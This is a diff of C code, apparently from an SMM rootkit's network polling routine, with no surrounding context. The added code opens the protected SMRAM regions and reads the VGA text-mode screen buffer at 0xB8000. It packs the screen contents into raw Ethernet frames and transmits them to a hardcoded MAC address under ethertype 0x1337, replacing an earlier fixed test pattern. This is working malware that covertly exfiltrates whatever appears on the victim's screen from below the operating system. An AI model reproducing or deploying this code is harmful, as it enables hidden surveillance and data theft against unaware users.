@@ -1,4 +1,7 @@
 #include <pci.h>
+#include <io.h>
+#include <video_defines.h>
+#include <smram.h>
 #include <pci-bother.h>
 #include <output.h>
 #include "net.h"
@@ -9,30 +12,50 @@ extern struct pci_driver a3c90x_driver;
 
 static char test[1024] = {0};
 
+static unsigned char vga_read(unsigned char idx)
+{
+	outb(CRTC_IDX_REG, idx);
+	return inb(CRTC_DATA_REG);
+}
+
+static unsigned int vga_base()
+{
+	return (((unsigned int) vga_read(CRTC_START_ADDR_MSB_IDX)) << 9)
+	     + (((unsigned int) vga_read(CRTC_START_ADDR_LSB_IDX)) << 1);
+}
+
 void eth_poll()
 {
 	int i;
-	static int c;
+//	static int c;
+	static short pos = 0x0;
+	unsigned short base = vga_base();
+	unsigned char *p = (unsigned char *)0xB8000;
+	smram_state_t old_state;
 	
 	if (!_nic)
 		return;
 
 	_nic->poll(_nic, 0);
+	smram_tseg_set_state(SMRAM_TSEG_OPEN);
+	old_state = smram_save_state();
 	
-	if ((c++) % 30)
-		return;
+//	if ((c++) % 2)
+//		return;
 	
-	for (i = 0; i < 1024; i++)
+	test[0] = pos >> 8;
+	test[1] = pos & 0xFF;
+	test[2] = base >> 8;
+	test[3] = base & 0xFF;
+
+	smram_aseg_set_state(SMRAM_ASEG_SMMCODE);
+	
+	for (i = 4; i < 1024; i++)
 	{
-		switch(i%5)
-		{
-		case 0: test[i] = 'H'; break;
-		case 1: test[i] = 'A'; break;
-		case 2: test[i] = 'R'; break;
-		case 3: test[i] = 'B'; break;
-		case 4: test[i] = 'L'; break;
-		}
+		test[i] = p[pos++];
+		pos %= 0x8000;
 	}
+	smram_restore_state(old_state);
 	_nic->transmit("\x00\x03\x93\x87\x84\x8C", 0x1337, 1024, test);
 }
 
